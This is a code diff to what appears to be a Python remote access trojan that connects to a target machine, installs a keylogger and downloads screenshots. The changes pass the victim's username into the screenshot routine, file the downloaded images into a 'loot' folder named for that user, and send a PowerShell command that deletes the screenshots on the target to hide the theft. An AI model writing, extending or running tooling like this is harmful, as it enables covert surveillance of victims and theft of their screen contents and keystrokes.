@@ -110,7 +110,7 @@ def exit():
 def current_date():
     current = datetime.now()
 
-    return current.strftime("%m/%d/%Y_%H-%M-%S")
+    return current.strftime("%m-%d-%Y_%H-%M-%S")
 
 # connects rat to target
 def connect(address, password):
@@ -166,12 +166,21 @@ def keylogger(address, password, username, working):
     print("\n[!] Restart target computer to execute")
 
 # takes screenshot
-def grab_screenshots(address, password, working):
+def grab_screenshots(address, password, working, username):
     # download screenshot
     print("[*] Downloading screenshots...")
     screenshot_location = f"{working}/amETlOMhPo"
     remote_download(address, password, screenshot_location)
     print("[+] Screenshot downloaded")
+
+    loot_folder = f"screenshots-{username}-{current_date()}"
+
+    os.system(f"mkdir ~/Downloads/{loot_folder}")
+    os.system(f"mv ~/Downloads/amETlOMhPo/* ~/Downloads/{loot_folder}")
+    os.system(f"rm -rf ~/Downloads/amETlOMhPo")
+
+    delete_screenshots = f"powershell Remove-Item {working}/amETlOMhPo/*"
+    remote_command(address, password, delete_screenshots)
 
     print("\n[+] Screenshot downloaded to \"~/Downloads\"\n")
 
@@ -293,7 +302,7 @@ def cli(arguments):
 
             # take screenshot option
             elif option == "4":
-                grab_screenshots(ipv4, password, working_direcory)
+                grab_screenshots(ipv4, password, working_direcory, target_username)
 
             # restart target option
             elif option == "5":
